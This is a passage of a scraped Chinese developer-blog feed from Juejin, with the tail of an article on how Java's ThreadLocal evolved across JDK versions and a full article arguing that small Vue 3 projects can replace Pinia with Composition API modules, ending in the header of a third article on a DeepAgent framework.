<pre><code class="hljs language-scala" lang="scala">static <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Entry</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">WeakReference&lt;ThreadLocal&lt;?&gt;&gt;</span> </span>{
    <span class="hljs-type">Object</span> value;
}
</code></pre>
</li>
<li>
<p>一旦 ThreadLocal 对象不再被外部引用，可以被 GC 回收，Entry 的 key 会变成 <code>null</code>。</p>
</li>
</ul>
<p><strong>为什么改成弱引用？</strong></p>
<ul>
<li>防止 ThreadLocal 对象不释放导致整组 Entry 无法被清理。</li>
</ul>
<p><strong>带来的副作用：</strong></p>
<ul>
<li>value 仍然是强引用，只要线程活着，value 永远不会被回收。</li>
<li>如果你不手动 <code>remove()</code>，依旧可能内存泄漏（尤其线程池）。</li>
</ul>
<p>至此，ThreadLocal 的内存泄漏问题变成了：</p>
<ul>
<li><strong>不是 key 泄漏，而是 value 泄漏。</strong></li>
</ul>
<hr/>
<h2 data-id="heading-3">4. JDK 6：清理机制增强 + TAB 数组 rehash 改善</h2>
<p><strong>JDK6 的重要演进：</strong></p>
<ul>
<li>加强对 key 为 <code>null</code> 的 Entry 的清理逻辑（例如访问冲突位点时主动清理）。</li>
<li>优化 rehash 和探测机制。</li>
</ul>
<p>整体结构仍为开放地址法，不改变本质机制。</p>
<hr/>
<h2 data-id="heading-4">5. JDK 7：性能优化 + 部分线程局部缓存行为改进</h2>
<p>JDK7 的变化偏向实现层。</p>
<p><strong>增强点：</strong></p>
<ul>
<li>完善冲突探测，降低哈希冲突导致的退化。</li>
<li>改善 nextIndex/prevIndex 的性能。</li>
<li>修复扩容后 rehash 的一些 bug。</li>
</ul>
<p>ThreadLocalMap 变得更健壮，但不改变语义。</p>
<hr/>
<h2 data-id="heading-5">6. JDK 8：清理策略进一步加强，核心逻辑成熟稳定</h2>
<p><strong>关键变化：</strong></p>
<ul>
<li>
<p>ThreadLocalMap 清理 <code>stale entry</code>（key = null）的策略更加激进：</p>
<ul>
<li>get/set/remove 时都会尝试清理死 key。</li>
</ul>
</li>
<li>
<p>内部 rehash 策略更高效。</p>
</li>
<li>
<p>线程池场景下的内存泄漏仍然需要手动处理 (<code>remove()</code>)，但 default 逻辑更健壮。</p>
</li>
</ul>
<p><strong>JDK8 的 ThreadLocal 基本成为行业主流参考实现。</strong></p>
<hr/>
<h2 data-id="heading-6">7. JDK 9：新增 <code>ThreadLocal.withInitial()</code>（语法糖）</h2>
<p>此版本以后属于稳定期，新增功能而非机制变化。</p>
<p><strong>新增：</strong></p>
<pre><code class="hljs language-scss" lang="scss">ThreadLocal<span class="hljs-selector-class">.withInitial</span>(() -&gt; new <span class="hljs-built_in">SimpleDateFormat</span>("yyyy-MM-dd"))
</code></pre>
<p>机制不变，易用性提升。</p>
<hr/>
<h2 data-id="heading-7">8. JDK 11 / JDK 17：几乎无变化，属于稳定维护期</h2>
<ul>
<li>持续做小修复，增强可读性与边界处理。</li>
<li>内存清理策略与 JDK8 几乎无差别。</li>
<li>语义和行为已经非常稳定。</li>
</ul>
<hr/>
<h2 data-id="heading-8">9. JDK 21：虚拟线程（Loom）下的 ThreadLocal 语义扩展（重要）</h2>
<p>在 Loom（虚拟线程）中：</p>
<p><strong>ThreadLocal 默认机制仍然可用，但成本更低：</strong></p>
<ul>
<li>虚拟线程是轻量结构，保留自己的 ThreadLocalMap。</li>
<li>虚拟线程不复用，生命周期短，因此不容易产生 ThreadLocal value 泄漏。</li>
</ul>
<p><strong>关键点：</strong></p>
<ul>
<li>虚拟线程不是池化线程，不会出现线程池泄漏问题。</li>
<li>某些场景 ThreadLocal 成本反而比传统线程更轻。</li>
</ul>
<hr/>
<h2 data-id="heading-9">10. 前后机制的核心变化总结</h2>


















































<table><thead><tr><th>JDK 版本</th><th>变化点</th><th>影响</th></tr></thead><tbody><tr><td>1.2</td><td>基本实现</td><td>存在严重泄漏风险</td></tr><tr><td>1.3-1.4</td><td>Bug 修复</td><td>稳定性增强</td></tr><tr><td>5</td><td><strong>key 改为弱引用</strong></td><td>避免 key 泄漏，但 value 泄漏依旧</td></tr><tr><td>6</td><td>加强化清理逻辑</td><td>降低内存泄漏风险</td></tr><tr><td>7</td><td>进一步优化冲突处理</td><td>性能提升</td></tr><tr><td>8</td><td><strong>成熟实现，清理更激进</strong></td><td>标准实现，被行业普遍使用</td></tr><tr><td>9+</td><td>易用性提升（withInitial）</td><td>开发体验增强</td></tr><tr><td>21</td><td>虚拟线程支持稳定</td><td>泄漏风险显著降低</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-10">11. 哪些问题贯穿所有版本？</h2>
<p>无论哪个版本，ThreadLocal 永远有两个核心风险：</p>
<ol>
<li><strong>value 会泄漏，只要线程还活着</strong></li>
<li><strong>线程池复用导致 value 长期驻留</strong></li>
</ol>
<p>这两个问题在 JDK21 的虚拟线程中弱化但未彻底消失。</p>
<hr/>
<h2 data-id="heading-11">12. 业内最佳实践</h2>
<ol>
<li>创建后必须手动 <code>remove()</code></li>
<li>避免在容器/框架级别缓存业务值</li>
<li>避免使用无界线程池结合 ThreadLocal</li>
<li>不要把 ThreadLocal 当成上下文传递机制（应使用 ThreadLocal 设计的框架）</li>
<li>推荐使用 <code>withInitial()</code> 避免 null 值</li>
</ol>
<hr/>
<h2 data-id="heading-12">13. 讲清楚本质</h2>
<p><strong>ThreadLocal 在整个 JDK 生命周期中的核心变化只有一次：JDK5 引入弱引用。</strong></p>
<p>其余版本改动都是：</p>
<ul>
<li>更激进的清理策略</li>
<li>更健壮的哈希探测与 rehash</li>
<li>更易用的 API</li>
<li>虚拟线程场景下的运行时表现改善</li>
</ul>
<p>但行为本质没有改变：</p>
<ul>
<li>每个线程维护一个 Map</li>
<li>key 弱引用</li>
<li>value 强引用</li>
<li>需要手动 remove，线程池中更应当如此</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[再来聊聊，Vue3 项目中 Pinia 的替代方案]]></title>    <link>https://juejin.cn/post/7575458028254674987</link>    <guid>https://juejin.cn/post/7575458028254674987</guid>    <pubDate>2025-11-23T11:23:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575458028254674987" data-draft-id="7575655132755394579" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="再来聊聊，Vue3 项目中 Pinia 的替代方案"/> <meta itemprop="keywords" content="前端,面试"/> <meta itemprop="datePublished" content="2025-11-23T11:23:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="前端布鲁伊"/> <meta itemprop="url" content="https://juejin.cn/user/4431511346492554"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            再来聊聊，Vue3 项目中 Pinia 的替代方案
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/4431511346492554/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    前端布鲁伊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T11:23:24.000Z" title="Sun Nov 23 2025 11:23:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    12
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{line-height:1.75;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;letter-spacing:2px;background-image:linear-gradient(90deg,rgba(50,0,0,.05) 3%,transparent 0),linear-gradient(1turn,rgba(50,0,0,.05) 3%,transparent 0);background-size:20px 20px;background-position:50%;word-break:break-word;font-weight:400;font-size:15px;overflow-x:hidden;color:#333}.markdown-body h1{font-size:23px;margin-bottom:5px;font-weight:700;padding-left:10px;border-left:5px solid #773098}.markdown-body h2{font-size:19px;font-weight:700;padding-left:10px;border-left:5px solid #916dd5}.markdown-body h3{font-size:17px;font-weight:700;padding-left:10px;border-left:5px solid #d89cf6}.markdown-body h4{font-size:16px}.markdown-body h5{font-size:15px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{display:block;max-width:100%;margin:1em 0;border-radius:6px;box-shadow:2px 4px 7px #999;user-select:none}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{padding:.2em .5em;font-weight:700;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-size:1em;color:#916dd5;word-break:break-word;overflow-x:auto;background-color:none;border-radius:2px}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{display:block;font-family:-apple-system-font,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei UI,Microsoft YaHei,Arial,sans-serif;font-weight:400;font-size:.9em;padding:16px 12px;margin:0;color:#333;word-break:normal;overflow-x:auto;background:#f8f8f8;scroll-behavior:smooth}.markdown-body a{text-decoration:none;color:#916dd5;font-weight:700;border-bottom:1px solid #916dd5}.markdown-body a:active,.markdown-body a:hover{color:#773098}.markdown-body table{display:inline-block!important;font-size:14px;width:auto;max-width:100%;overflow:auto;border:1px solid #916dd5;border-collapse:collapse}.markdown-body thead{background-color:#916dd5;color:#fff;text-align:left}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px;border:1px solid #916dd5}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #d89cf6;background-color:#f4eeff}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0;line-height:26px}.markdown-body ol,.markdown-body ul{padding-left:28px;list-style-type:circle}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body b,.markdown-body strong{color:#916dd5;font-weight:700}.markdown-body b:before,.markdown-body strong:before{content:"「"}.markdown-body b:after,.markdown-body strong:after{content:"」"}.markdown-body em,.markdown-body i{color:#916dd5}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="a11y-dark">.hljs-comment,.hljs-quote{color:#d4d0ab}.hljs-deletion,.hljs-name,.hljs-regexp,.hljs-selector-class,.hljs-selector-id,.hljs-tag,.hljs-template-variable,.hljs-variable{color:#ffa07a}.hljs-built_in,.hljs-builtin-name,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-type{color:#f5ab35}.hljs-attribute{color:gold}.hljs-addition,.hljs-bullet,.hljs-string,.hljs-symbol{color:#abe338}.hljs-section,.hljs-title{color:#00e0e0}.hljs-keyword,.hljs-selector-tag{color:#dcc6e0}.markdown-body pre,.markdown-body pre&gt;code.hljs{background:#2b2b2b;color:#f8f8f2}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}@media screen and (-ms-high-contrast:active){.hljs-addition,.hljs-attribute,.hljs-built_in,.hljs-builtin-name,.hljs-bullet,.hljs-comment,.hljs-link,.hljs-literal,.hljs-meta,.hljs-number,.hljs-params,.hljs-quote,.hljs-string,.hljs-symbol,.hljs-type{color:highlight}.hljs-keyword,.hljs-selector-tag{font-weight:700}}</style><p><strong>想获取更多2025年最新前端场景题可以看这里</strong>：<a href="https://link.juejin.cn?target=https%3A%2F%2Ffe.ecool.fun%2Ftopic-list%3Fic%3DKIQC2F%26from%3Djuejin_article" target="_blank" title="https://fe.ecool.fun/topic-list?ic=KIQC2F&amp;from=juejin_article" ref="nofollow noopener noreferrer">fe.ecool.fun</a></p>
<p>大家好，我是刘布斯。</p>
<p>之前转载了一篇文章<strong>Vue 项目不要再用 Pinia 了</strong>，先不可否认，这文章有点标题党的意思。但这篇文章的主要观点是说，在中小项目里，用 Vue 3 自带的组合式 API（<code>reactive</code> / <code>ref</code>）来管状态，很多时候比硬上 Pinia 要香。</p>
<p>好家伙，评论区一下就热闹了，总结起来是：“Pinia 多好用，你肯定是没用明白 Pinia”</p>
<p>说实话，我确实有点意外。</p>
<p><strong>我先摆明态度：Pinia 是个非常优秀的状态管理库。</strong> 尤雨溪团队亲自操刀，API 设计简洁，TS 支持完美，插件系统灵活，Devtools 体验丝滑。这一点，没人能否认。</p>
<p>但我的核心观点是：<strong>优秀，不代表“所有场景都必须上”。</strong></p>
<p>我发现现在很多团队，尤其是从 Vue 2 刚迁到 Vue 3 不久的，存在一种很强的 <strong>“状态管理惯性”</strong> 。</p>
<p>什么意思？</p>
<p>在 Vue 2 + Options API 的时代，组件（Component）和状态（State）是“隔离”的。<code>data</code> 里的状态天生就是“内向”的，组件一销毁，状态就没了。跨组件通信、全局状态共享，你怎么办？你没得选，你必须上 Vuex。Vuex 就像一个“中央空调”，你不用它，别的房间（组件）就享受不到冷气（状态）。</p>
<p>所以，Vue 2 时代养成了我们的思维定式：<strong>做项目 = Vue 全家桶 = Vue + Vue Router + Vuex。</strong></p>
<p>到了 Vue 3，Vuex 退位，Pinia 继任。于是大家理所当然地把公式换成了：<strong>做项目 = Vue 3 + Vue Router + Pinia。</strong></p>
<p>启动一个新项目，<code>npm create vue@latest</code>，一路 <code>yes</code> 下来，Pinia 就装好了。然后就开始 <code>defineStore</code>。</p>
<p>但大家好像都忽略了 Vue 3 最大的革命性变化——<strong>组合式 API (Composition API)</strong> 本身，就已经是一种强大的状态管理模式了。</p>
<h4 data-id="heading-0"><code>defineStore</code> 帮我们做了什么？</h4>
<p>还是用那篇文章中的例子，做一个最简单的“用户状态管理”，两种方式有什么区别。</p>
<p><strong>1. Pinia 的方式：</strong> 你得先在 <code>stores/user.ts</code> 里：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { defineStore } <span class="hljs-keyword">from</span><span class="hljs-string">'pinia'</span>
<span class="hljs-keyword">import</span> { ref, computed } <span class="hljs-keyword">from</span><span class="hljs-string">'vue'</span>

exportconst useUserStore = <span class="hljs-title function_">defineStore</span>(<span class="hljs-string">'user'</span>, <span class="hljs-function">() =&gt;</span> {
<span class="hljs-comment">// State</span>
<span class="hljs-keyword">const</span> token = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> userProfile = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)

<span class="hljs-comment">// Getters</span>
<span class="hljs-keyword">const</span> isLoggedIn = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> !!token.<span class="hljs-property">value</span>)

<span class="hljs-comment">// Actions</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">data</span>) {
    token.<span class="hljs-property">value</span> = data.<span class="hljs-property">token</span>
    userProfile.<span class="hljs-property">value</span> = data.<span class="hljs-property">profile</span>
    <span class="hljs-comment">// ... 存 localstorage</span>
  }

<span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"/>) {
    token.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>
    userProfile.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>
    <span class="hljs-comment">// ... 清 localstorage</span>
  }

<span class="hljs-keyword">return</span> { token, userProfile, isLoggedIn, login, logout }
})
</code></pre>
<p>然后在组件里 <code>useUserStore()</code>。</p>
<p><strong>2. 组合式 API 的方式：</strong> 你在 <code>stores/user.ts</code> (对，你也可以叫 <code>stores</code> 目录，这只是个文件夹)：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">import</span> { ref, computed, reactive } <span class="hljs-keyword">from</span><span class="hljs-string">'vue'</span>

<span class="hljs-comment">// 以前我们用 reactive，这里用 ref/computed 模拟 Pinia 的结构</span>
<span class="hljs-keyword">const</span> token = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)
<span class="hljs-keyword">const</span> userProfile = <span class="hljs-title function_">ref</span>(<span class="hljs-literal">null</span>)

<span class="hljs-keyword">const</span> isLoggedIn = <span class="hljs-title function_">computed</span>(<span class="hljs-function">() =&gt;</span> !!token.<span class="hljs-property">value</span>)

<span class="hljs-keyword">function</span> <span class="hljs-title function_">login</span>(<span class="hljs-params">data</span>) {
  token.<span class="hljs-property">value</span> = data.<span class="hljs-property">token</span>
  userProfile.<span class="hljs-property">value</span> = data.<span class="hljs-property">profile</span>
<span class="hljs-comment">// ... 存 localstorage</span>
}

<span class="hljs-keyword">function</span> <span class="hljs-title function_">logout</span>(<span class="hljs-params"/>) {
  token.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>
  userProfile.<span class="hljs-property">value</span> = <span class="hljs-literal">null</span>
<span class="hljs-comment">// ... 清 localstorage</span>
}

<span class="hljs-comment">// 导出一个 hook</span>
<span class="hljs-keyword">export</span><span class="hljs-keyword">function</span> <span class="hljs-title function_">useUser</span>(<span class="hljs-params"/>) {
<span class="hljs-keyword">return</span> { token, userProfile, isLoggedIn, login, logout }
}
</code></pre>
<p>然后在组件里 <code>useUser()</code>。</p>
<hr/>
<p>好了，你对比下这两段代码。</p>
<p><strong>你发现了什么？</strong></p>
<p>在第二种方式里，我只是删掉了 <code>defineStore('user', ...)</code> 那层“壳”，然后把导出的 <code>useUserStore</code> 改成了 <code>useUser</code> (叫什么都行)。</p>
<p><strong>其他的逻辑，一模一样！</strong> 都是在用 <code>ref</code> 和 <code>computed</code>。</p>
<p>Pinia 的 <code>defineStore</code> 在这个场景里，本质上就是帮你做了一件事：<strong>创建了一个跨组件共享的、响应式的单例。</strong></p>
<p>但在 Vue 3 里，<code>import</code> 一个在模块顶层（module scope）定义的 <code>ref</code> 或 <code>reactive</code> 对象，它<strong>天生就是单例</strong>！它天生就是跨组件共享的！</p>
<p>那你可能会反问了：“那 Pinia 岂不是多此一举？”</p>
<p>不，它当然不是多此一举。它提供了 <code>defineStore</code> 这个“壳”，是为了给你带来额外的好处，最核心的就是：</p>
<ol>
<li><strong>Devtools 集成</strong>：这是 Pinia 最大的杀手锏。你可以在时间轴上看到 <code>action</code> 的调用、<code>state</code> 的变更。</li>
<li><strong>插件系统</strong>：比如实现数据持久化，Pinia 有现成的插件，<code>defineStore</code> 的时候配置一下就行。</li>
<li><strong>SSR 支持</strong>：在服务端渲染时，Pinia 能帮你处理好状态的序列化和“注水”(hydration)。</li>
<li><strong>更严格的“心智模型”</strong> ：它强制你区分 <code>state</code>、<code>getters</code>、<code>actions</code>，让团队协作更规范。</li>
</ol>
<h4 data-id="heading-1">Pinia的优势，你的项目真的需要吗？</h4>
<p>我们再回到上篇文章的核心观点：</p>
<p><strong>在一个中小型项目、独立开发、或者团队成员对组合式 API 都很熟练的场景下，上面 Pinia 提供的 4 个好处，你真的都需要吗？</strong></p>
<ul>
<li><strong>Devtools</strong>：说实话，在我十多年的生涯里，除了在 Redux/Vuex 刚出来那会儿，为了调试复杂的异步流和中间件，会去用时间旅行。在绝大多数业务场景里，<code>console.log</code> 和 Vue Devtools 里自带的组件状态检查，已经解决了 99% 的问题。为了那 1% 的“可能”，去引入一个库，划算吗？</li>
<li><strong>插件系统（如持久化）</strong> ：用组合式 API 怎么做持久化？太简单了。你封装的 <code>useUser</code> hook 里面，<code>login</code> 的时候加一行 <code>localStorage.setItem</code>，初始化 <code>token</code> 的时候加一行 <code>localStorage.getItem</code>。这不就是最原始、最可控的持久化吗？你需要为这么点功能，去学一个 Pinia 插件的 API 吗？</li>
<li><strong>SSR</strong>：如果你的项目压根就不是 SSR，那这条对你无效。</li>
<li><strong>严格的心智模型</strong>：这是最大的“陷阱”。组合式 API 的核心思想就是“自由”。它允许你把 <code>state</code> 和 <code>action</code> 放在一起，按“功能”去组织代码，而不是按“类型”（state/getter/action）去组织。<code>defineStore</code> 某种程度上，是又把我们拉回了 Vuex 的那种“分门别类”的思维里。</li>
</ul>
<p>所以，“你会得到更少的心智负担”指的就是这个。</p>
<p>你不需要去记 <code>defineStore</code> 的 API，不需要去想“我这个逻辑是算 <code>getter</code> 还是 <code>action</code>”，你就是在写 JS/TS，你就是在写 <code>function</code>。<strong>这难道不是一种解放吗？</strong></p>
<h4 data-id="heading-2"><strong>什么叫“没用明白 Pinia”？</strong></h4>
<p>在我看来，恰恰相反。</p>
<p><strong>把 Pinia 当成新时代的 Vuex，不分场景、启动项目就先装上，这才是“没用明白 Vue 3”。</strong></p>
<p>如果没有明白 Vue 3 组合式 API 到底给了你多大的“自由”和“能力”，就可能继续用 Vue 2 的“保姆式”思维在写 Vue 3。</p>
<p>我想了几个场景，大家参考下：</p>
<ol>
<li><strong>场景一：个人项目、小团队敏捷开发、内部工具</strong></li>
</ol>
<ul>
<li><strong>我的选择：100% 使用组合式 API。</strong></li>
<li><strong>理由：</strong> 速度快，灵活，零依赖。我可以按功能拆分 <code>useCounter.ts</code>, <code>useUser.ts</code>, <code>useCart.ts</code>... 它们就是一堆 TS 模块，需要共享就在顶层定义 <code>reactive</code>，不需要就只导出函数。打包体积更小，心智负担为零。</li>
</ul>
<ol start="3">
<li><strong>场景二：大型企业级应用、多团队协作、需要强规范</strong></li>
</ol>
<ul>
<li><strong>我的选择：我会倾向于使用 Pinia。</strong></li>
<li><strong>理由：</strong> 这种项目，“规范”大于“灵活”。<code>defineStore</code> 提供的统一范式，能让不同水平的开发者（尤其是新人）写出风格更一致的代码。而且在这种复杂项目里，Devtools 的时间旅行和状态快照，在排查深层 Bug 时，确实能派上用场。</li>
</ul>
<ol start="5">
<li><strong>场景三：需要 SSR 的项目</strong></li>
</ol>
<ul>
<li><strong>我的选择：用 Pinia。</strong></li>
<li><strong>理由：</strong> 别重复造轮子。Pinia 对 SSR 状态处理得很好，自己搞一套组合式 API 的 SSR 状态同步，费时费力，不值得。</li>
</ul>
<p>所以你看，并不是在全盘否定 Pinia，而是在呼吁大家 <strong>“按需选择”</strong> 。</p>
<p>不要因为“大家都用”或者“官方推荐”就去用。工具是死的，人是活的。Vue 3 给了我们一把更轻、更快的匕首（组合式 API），你为什么非要抱着那把很牛、但也很重的开山刀（Pinia）不放，连切个水果都要用它呢？</p>
<p>下次在项目里 <code>npm install pinia</code> 之前，先停 5 秒钟，问问自己：<strong>我这次，真的需要它吗？还是说，几个 <code>ref</code> 和 <code>reactive</code> 就能搞定了？</strong></p>
<p>想明白这个问题，可能比你多刷 10 篇 Pinia 的教程都有用。</p>
<p>行了，今天就聊到这。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深度智能体框架DeepAgent剖析]]></title>    <link>https://juejin.cn/post/7575152891955249152</link>    <guid>https://juejin.cn/post/7575152891955249152</guid>    <pubDate>2025-11-23T00:55:04.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575152891955249152" data-draft-id="7575152891955232768" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深度智能体框架DeepAgent剖析"/> <meta itemprop="keywords" content="人工智能,开源"/> <meta itemprop="datePublished" content="2025-11-23T00:55:04.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="深度学习机器"/> <meta itemprop="url" content="https://juejin.cn/user/486421344552179"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深度智能体框架DeepAgent剖析
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/486421344552179/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    深度学习机器
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T00:55:04.000Z" title="Sun Nov 23 2025 00:55:04 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body 